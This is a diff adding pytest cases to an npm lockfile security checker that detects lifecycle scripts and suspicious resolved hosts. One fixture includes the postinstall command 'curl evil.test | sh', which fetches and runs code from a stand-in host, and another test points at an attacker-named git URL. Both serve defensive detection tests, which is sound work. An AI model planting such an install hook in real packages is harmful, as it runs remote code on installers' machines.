@@ -52,6 +52,23 @@ def _write_minimal_lockfile(path: Path, packages: dict) -> None:
     )
 
 
+def _write_v1_lockfile(path: Path, dependencies: dict) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(
+        json.dumps(
+            {
+                "name": "synthetic",
+                "version": "0.0.0",
+                "lockfileVersion": 1,
+                "requires": True,
+                "dependencies": dependencies,
+            },
+            indent=2,
+        ),
+        encoding="utf-8",
+    )
+
+
 # ---- check 1: shai-hulud-workflow.yml ----
 
 
@@ -162,6 +179,31 @@ def test_check2_fires_on_malformed_lockfile(tmp_path):
     assert "not valid JSON" in out[0]
 
 
+def test_check2_fires_on_v1_nested_postinstall(tmp_path):
+    mod = _load_module()
+    lockfile = tmp_path / "package-lock.json"
+    _write_v1_lockfile(
+        lockfile,
+        {
+            "parent": {
+                "version": "1.0.0",
+                "resolved": "https://registry.npmjs.org/parent/-/parent-1.0.0.tgz",
+                "dependencies": {
+                    "malicious": {
+                        "version": "1.0.0",
+                        "resolved": "https://registry.npmjs.org/malicious/-/malicious-1.0.0.tgz",
+                        "scripts": {"postinstall": "curl evil.test | sh"},
+                    }
+                },
+            }
+        },
+    )
+    out = mod.check_no_lifecycle_scripts(lockfile)
+    assert len(out) == 1
+    assert "parent > malicious" in out[0]
+    assert "postinstall" in out[0]
+
+
 # ---- check 3: lockfile hosts ----
 
 
@@ -235,6 +277,24 @@ def test_check3_skips_resolved_omitted(tmp_path):
     )
     out = mod.check_lockfile_hosts(lockfile)
     assert out == [], f"resolved-omitted entries must be skipped; got {out}"
+
+
+def test_check3_fires_on_v1_git_plus_url(tmp_path):
+    mod = _load_module()
+    lockfile = tmp_path / "package-lock.json"
+    _write_v1_lockfile(
+        lockfile,
+        {
+            "sus": {
+                "version": "1.0.0",
+                "resolved": "git+https://github.com/attacker/sus.git#abc123",
+            }
+        },
+    )
+    out = mod.check_lockfile_hosts(lockfile)
+    assert len(out) == 1
+    assert "sus" in out[0]
+    assert "non-https" in out[0]
 
 
 # ---- end-to-end sweep ----
